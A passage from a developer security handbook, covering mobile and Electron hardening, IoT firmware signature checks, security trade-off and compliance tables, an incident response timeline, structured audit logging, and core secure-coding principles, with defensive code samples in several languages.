    async def test_security_headers_present(self, client: AsyncClient):
        response = await client.get("/health")
        assert response.headers.get("X-Content-Type-Options") == "nosniff"
        assert response.headers.get("X-Frame-Options") == "DENY"
        assert "max-age" in response.headers.get("Strict-Transport-Security", "")
        assert "Server" not in response.headers  # Fingerprinting removed
```

---

## Chapter 22: Platform-Specific Security

### 22.1 Mobile Security (iOS / Android)

```
MOBILE THREAT                   MITIGATION
──────────────────────────────────────────────────────────────────────────────
Insecure data storage           Use Keychain (iOS) / Keystore (Android)
                                Never store tokens in SharedPreferences or UserDefaults
                                (unencrypted on rooted devices)

Insecure network communication  Certificate pinning: reject if cert changes
                                TLS 1.2+ only; no plain HTTP

Insecure authentication         Biometric authentication via platform APIs
                                Short-lived tokens; refresh silently
                                Device binding: tie token to device fingerprint

Reverse engineering             ProGuard/R8 obfuscation (Android)
                                Bitcode stripping (iOS)
                                Anti-debugging (limited effectiveness)

Client-side injection           React Native: same XSS/injection rules as web
                                Validate ALL server responses — attacker can MITM

Jailbreak/Root detection        Detect and warn (not block — sophisticated attackers
                                can bypass; defense in depth, not sole control)
```

```typescript
// React Native — Certificate Pinning with react-native-ssl-pinning
import { fetch as pinnedFetch } from 'react-native-ssl-pinning';

async function secureApiCall(endpoint: string, options: RequestInit): Promise<Response> {
    return pinnedFetch(`https://api.example.com${endpoint}`, {
        ...options,
        sslPinning: {
            certs: ['cert1', 'cert2'],  // Certificate fingerprints from bundle
        },
        headers: {
            'Content-Type': 'application/json',
            ...options.headers,
        },
    });
}
// If server certificate doesn't match pinned cert, request fails
// Prevents MitM attacks even with rogue CA installed on device
```

### 22.2 Desktop Application Security (Electron)

Electron applications run Chromium + Node.js. The combination is extremely powerful — and extremely dangerous if misconfigured.

```javascript
// Electron — main process secure configuration
const { app, BrowserWindow, shell } = require('electron');

function createWindow() {
    const win = new BrowserWindow({
        webPreferences: {
            // CRITICAL SECURITY SETTINGS:
            nodeIntegration:         false, // No Node.js in renderer — prevents XSS → RCE
            contextIsolation:        true,  // Renderer and preload in separate contexts
            sandbox:                 true,  // OS-level sandboxing
            webSecurity:             true,  // Same-origin policy enforced
            allowRunningInsecureContent: false,
            enableBlinkFeatures:     '',    // No experimental features
            preload: path.join(__dirname, 'preload.js'),
        },
    });

    // Navigation restrictions — prevent redirect to arbitrary URLs
    win.webContents.on('will-navigate', (event, url) => {
        const parsedUrl = new URL(url);
        if (parsedUrl.origin !== 'https://app.example.com') {
            event.preventDefault(); // Block navigation to external origins
        }
    });

    // Open external links in browser, not in Electron window
    win.webContents.setWindowOpenHandler(({ url }) => {
        shell.openExternal(url); // Opens in user's browser, not in Electron
        return { action: 'deny' }; // Don't open in Electron
    });

    // CSP for renderer
    session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Content-Security-Policy': [
                    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
                ]
            }
        });
    });
}

// Preload.js — the safe bridge between renderer and main process
const { contextBridge, ipcRenderer } = require('electron');

contextBridge.exposeInMainWorld('api', {
    // Only expose specific, whitelisted operations
    readFile: (path) => ipcRenderer.invoke('read-file', path),
    saveSettings: (settings) => ipcRenderer.invoke('save-settings', settings),
    // Never expose ipcRenderer directly — gives renderer full IPC access
});
```

### 22.3 IoT Security

```
IoT THREAT                      MITIGATION
──────────────────────────────────────────────────────────────────────────────
Default credentials             Factory reset resets to unique per-device credential
                                Force password change on first boot
                                Credential stored in hardware secure element

Firmware tampering              Code signing for firmware updates
                                Secure boot chain (BootROM → Bootloader → OS → App)
                                Reject unsigned firmware images

Insecure update mechanism       HTTPS only for OTA updates
                                Signature verification before applying
                                Rollback protection (version counter in fuse)

Physical access                 Disable debug ports (JTAG, UART) in production
                                Encrypt storage; full disk encryption
                                Tamper detection

Network protocol                TLS with mutual auth (device cert)
                                MQTT with client certificate authentication
                                Network segmentation (IoT VLAN isolated from IT)

Sensitive data on device        Store secrets in hardware secure element (TPM, SE)
                                Never store API keys in firmware images
                                Attestation-based key provisioning
```

```python
# Python — IoT device firmware update with signature verification
import hashlib
import hmac
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec, utils
from cryptography.hazmat.primitives.serialization import load_pem_public_key

VENDOR_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
-----END PUBLIC KEY-----"""

def verify_firmware_update(firmware_bytes: bytes, signature: bytes) -> bool:
    """
    Verify firmware image signature before applying update.
    Uses ECDSA P-256 with SHA-256 — small footprint for embedded systems.
    """
    try:
        public_key = load_pem_public_key(VENDOR_PUBLIC_KEY_PEM)

        # Verify ECDSA signature
        public_key.verify(
            signature,
            firmware_bytes,
            ec.ECDSA(hashes.SHA256())
        )
        return True  # Signature valid
    except Exception:
        return False  # Invalid signature — reject firmware

def apply_firmware_update(firmware_bytes: bytes, signature: bytes, version: int) -> bool:
    # Step 1: Verify signature
    if not verify_firmware_update(firmware_bytes, signature):
        log.error("Firmware signature verification FAILED — rejecting update")
        return False

    # Step 2: Rollback protection — reject older versions
    current_version = get_current_firmware_version()  # From secure fuse
    if version <= current_version:
        log.error(f"Rollback attempt: {version} <= {current_version}")
        return False

    # Step 3: Apply update atomically (A/B partition scheme)
    write_to_inactive_partition(firmware_bytes)
    verify_written_firmware()    # Re-read and verify
    switch_active_partition()    # Atomic; old firmware still in inactive partition
    schedule_reboot()
    return True
```

---

## Chapter 23: Trade-Off Analysis

Every security control has a cost. Understanding trade-offs lets you make principled decisions rather than applying security theater.

### 23.1 The Security-Usability-Performance Triangle

```
              SECURITY
               /\
              /  \
             /    \
            /      \
           /________\
     USABILITY    PERFORMANCE

You cannot maximize all three simultaneously.
Every security control costs either usability or performance or both.
```

```
CONTROL                     USABILITY COST    PERFORMANCE COST    RISK REDUCED
────────────────────────────────────────────────────────────────────────────────
MFA on every login          Medium            None                High (auth bypass)
MFA only on suspicious login Low              Low                 Medium
Hardware MFA (FIDO2)        Low               None                Very High

Argon2id password hashing   None              High (300ms/hash)   High (breach impact)
bcrypt                      None              Medium (100ms)      High

Full request body logging   None              Medium              Low (visibility only)
Audit log (auth events only) None             Low                 Medium

TLS 1.3 only                Medium (old clients) Very Low         High
TLS 1.2+                    Low               Very Low            High

CSP strict-dynamic          High (dev effort) None                Very High (XSS)
CSP report-only             Low               None                Low (detection only)

Synchronous SAST in PR      High (dev friction) N/A               Very High (catches bugs)
Async SAST on merge         Low               N/A                 High (some escape)

mTLS between microservices  Low (ops cost)    Medium (handshakes) Very High (lateral movement)
JWT validation only         Very Low          Low                 Medium

AES-256-GCM column encrypt  Low               Medium              High (breach impact)
Application-level encrypt   High (dev effort) High                Very High (breach impact)
```

### 23.2 The Compliance Cost Matrix

```
COMPLIANCE FRAMEWORK    ENGINEERING EFFORT    MINIMUM CONTROLS
────────────────────────────────────────────────────────────────────────────
SOC 2 Type II           4–6 months minimum    Audit logging, access controls,
                                              encryption, incident response,
                                              change management, monitoring

GDPR                    2–4 months for        Consent management, data
                        data-handling systems  mapping, deletion APIs,
                                              DPA agreements, breach notification

PCI DSS Level 4         2–3 months            Tokenization, TLS, access controls,
(< 20K Visa txn/yr)                           quarterly scans

PCI DSS Level 1         6–12 months           Everything above + annual pen test
(> 6M txn/yr)                                 + QSA audit + firewalls + more

HIPAA                   3–6 months            PHI encryption, access controls,
                                              audit logs, BAA agreements,
                                              breach notification

ISO 27001               12–24 months          Full ISMS, risk assessment, 
                                              14-domain controls, external audit

NIST CSF                3–6 months            Identify, Protect, Detect,
                                              Respond, Recover functions
```

---

## Chapter 24: Incident Response for Developers

### 24.1 The Developer's Role in a Breach

When a breach occurs, developers are not bystanders. They own:
- Understanding the vulnerable code path
- Deploying emergency patches
- Understanding the blast radius (what data was exposed)
- Building forensic capability into the system

```
INCIDENT TIMELINE                DEVELOPER ACTIONS
──────────────────────────────────────────────────────────────────────────────
T+0: Alert fires                 Acknowledge; gather initial context from logs
                                 Do NOT start deleting logs to "clean up"

T+15min: Triage                  Is this a false positive or real?
                                 What's the attack vector?
                                 What data/systems are potentially affected?

T+30min: Containment             Rotate potentially compromised secrets NOW
                                 Revoke tokens for affected users
                                 Block IP/user agents if pattern identified
                                 Consider taking vulnerable endpoint offline

T+1h: Assessment                 Determine data exposure scope
                                 Check audit logs for exfiltration indicators
                                 Preserve logs for forensics (write to immutable store)

T+2h: Communication              Brief CISO, legal, communications team
                                 GDPR: 72h clock starts if personal data involved
                                 Prepare customer communication

T+4h: Remediation                Deploy patch (don't rush; test first)
                                 Or deploy mitigation (WAF rule, feature flag)
                                 Re-enable endpoint with fix verified

T+24h: Post-incident             Root cause analysis written
                                 Timeline documented
                                 Controls gap identified
                                 Blameless postmortem scheduled
```

### 24.2 Structured Audit Logging

```python
# Python — audit log structure that enables forensic investigation
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from typing import Any
import structlog
import json

class AuditEventType(Enum):
    AUTH_SUCCESS           = "auth.success"
    AUTH_FAILURE           = "auth.failure"
    AUTH_MFA_BYPASS_ATTEMPT = "auth.mfa_bypass_attempt"
    DATA_ACCESS            = "data.access"
    DATA_MODIFICATION      = "data.modification"
    DATA_DELETION          = "data.deletion"
    PERMISSION_DENIED      = "authz.denied"
    ADMIN_ACTION           = "admin.action"
    SECRET_ACCESS          = "secret.access"
    CONFIG_CHANGE          = "config.change"

@dataclass
class AuditEvent:
    event_type:    AuditEventType
    actor_id:      str          # user_id or service_account
    actor_ip:      str
    actor_ua:      str          # User-Agent
    resource_type: str          # "invoice", "user", "admin_panel"
    resource_id:   str          # UUID of the affected resource
    outcome:       str          # "success" | "failure" | "denied"
    timestamp:     datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    details:       dict = field(default_factory=dict)
    request_id:    str = ""     # Correlation ID for tracing

    def to_json(self) -> str:
        return json.dumps({
            "timestamp":     self.timestamp.isoformat(),
            "event_type":    self.event_type.value,
            "actor_id":      self.actor_id,
            "actor_ip":      self.actor_ip,
            "actor_ua":      self.actor_ua[:256],  # Truncate; not stored in full
            "resource_type": self.resource_type,
            "resource_id":   self.resource_id,
            "outcome":       self.outcome,
            "request_id":    self.request_id,
            "details":       self.details,
        }, separators=(',', ':'))

# Audit log must be:
# 1. Immutable (append-only; not updateable by app users)
# 2. Forwarded to SIEM in real-time (Splunk, Elastic, Datadog)
# 3. Retained per compliance requirements (GDPR: 1yr, PCI: 1yr, HIPAA: 6yr)
# 4. Structured (JSON; machine-parseable for alerting)
# 5. Tamper-evident (hash-chained or write to separate secured store)

logger = structlog.get_logger()

def log_audit_event(event: AuditEvent):
    # Write to structured log → aggregated by log shipper → SIEM
    logger.info(
        event.event_type.value,
        **json.loads(event.to_json())
    )
    # For high-security events, also write directly to immutable audit DB
    if event.event_type in (
        AuditEventType.AUTH_MFA_BYPASS_ATTEMPT,
        AuditEventType.ADMIN_ACTION,
        AuditEventType.SECRET_ACCESS,
    ):
        write_to_immutable_audit_store(event)
```

---

## Summary: The Security Principles Every Developer Must Internalize

```
PRINCIPLE                        WHAT IT MEANS IN CODE
──────────────────────────────────────────────────────────────────────────────────
1. Never trust user input         Validate, sanitize, and constrain ALL input
                                  at the application boundary

2. Principle of Least Privilege   Services, users, and processes get only the
                                  permissions they need — nothing more

3. Defense in Depth               Every security control can fail; layer multiple
                                  independent controls

4. Fail Securely                  Errors and exceptions should default to the
                                  most restrictive state, not open access

5. Security by Default            Secure configurations are the default;
                                  insecure options require explicit opt-in

6. Separation of Concerns         Separate authentication, authorization, logging,
                                  and business logic — each testable independently

7. Don't Roll Your Own Crypto     Use well-audited libraries; implement no
                                  cryptographic primitives from scratch

8. Assume Breach                  Design systems assuming the perimeter will fail;
                                  minimize blast radius, detect anomalies quickly

9. Treat Secrets as Secrets       Never in code, logs, URLs, or error messages;
                                  rotate regularly; audit access

10. Security as Code              Security controls in automated tests, CI pipelines,
                                  IaC policies — not in post-deploy audits
```

---

*This is Part 1 of the Developer's Cybersecurity Mastery handbook. Covered: Security foundations, threat modeling (STRIDE, LINDDUN, PASTA), cryptography (AES-GCM, RSA, ECC, TLS), authentication (JWT, OAuth2, passwords), OWASP Top 10 attacks and defenses, secure coding in Java/Python/Go/Rust/TypeScript, security headers, secrets management, GDPR/PCI-DSS compliance, SAST integration, and incident response. All examples are production-ready and cross-language.*
